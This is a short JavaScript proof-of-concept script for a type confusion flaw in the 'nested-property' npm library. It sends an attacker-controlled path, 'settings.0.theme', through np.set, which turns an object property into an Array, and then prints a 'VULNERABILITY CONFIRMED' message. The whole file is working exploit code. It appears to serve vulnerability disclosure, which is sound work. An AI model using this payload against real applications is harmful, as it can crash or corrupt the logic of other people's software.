const np = require("nested-property");

console.log("=== Type Confusion PoC ===\n");

// 1. Simulate a target object
const user = {
  username: "bob"
};

console.log("Before Update: user.settings =", user.settings);

// 2. The attacker sends a path containing a numeric index ("0")
const attackerPayload = {
  path: "settings.0.theme",
  value: "dark"
};

// 3. Application applies the update
np.set(user, attackerPayload.path, attackerPayload.value);

console.log("\nAfter Update:");
console.log(user);
console.log("Is user.settings an Array?", Array.isArray(user.settings));

if (Array.isArray(user.settings)) {
  console.log("\n[!] VULNERABILITY CONFIRMED: Type Confusion successful.");
  console.log("    The property 'settings' was forcefully instantiated as an Array instead of an Object.");
  console.log("    Downstream logic expecting Object methods will crash or misbehave.");
}
